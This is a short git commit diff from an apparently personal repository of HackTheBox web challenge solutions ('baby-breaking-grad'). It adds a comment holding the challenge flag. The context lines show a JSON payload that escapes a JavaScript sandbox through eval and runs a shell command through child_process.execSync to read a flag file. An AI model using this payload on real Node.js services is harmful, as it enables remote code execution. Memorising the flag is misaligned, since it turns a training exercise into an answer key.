ddd490c94292bf348d73ea1ab7fc0db016b72825
dillon wu <dillonwu999@gmail.com>
2023-09-23 23:55:18 -0400

    flag

--- hackthebox/challenges/web/baby-breaking-grad/solve.js
+++ hackthebox/challenges/web/baby-breaking-grad/solve.js
@@ -14,3 +14,5 @@ console.log(weight)
  *  "formula":"(function(x){return `${eval(\"throw new TypeError(global.process.mainModule.constructor._load('child_process').execSync('cat flagKntmG').toString())\")}`})()"
  * }
  */
+
+// Flag: HTB{f33l1ng_4_l1ttl3_blu3_0r_m4yb3_p1nk?...you_n33d_to_b3h4v&#39;eval!!}
